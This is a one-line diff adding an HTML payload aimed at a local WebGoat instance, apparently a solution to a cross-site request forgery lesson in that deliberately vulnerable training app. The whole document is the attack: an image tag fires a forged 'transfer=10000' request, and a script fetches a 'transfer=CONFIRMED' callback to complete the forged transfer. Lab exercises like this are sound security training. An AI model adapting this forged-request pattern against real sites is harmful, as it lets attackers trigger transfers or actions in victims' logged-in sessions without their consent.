@@ -1,0 +1,1 @@
+<img src="http://localhost:8090/WebGoat/attack?Screen=2094584595&menu=900&transfer=10000"><body><script>const callback = "http://localhost:8090/WebGoat/attack?transfer=CONFIRMED";fetch(callback);</script></body>
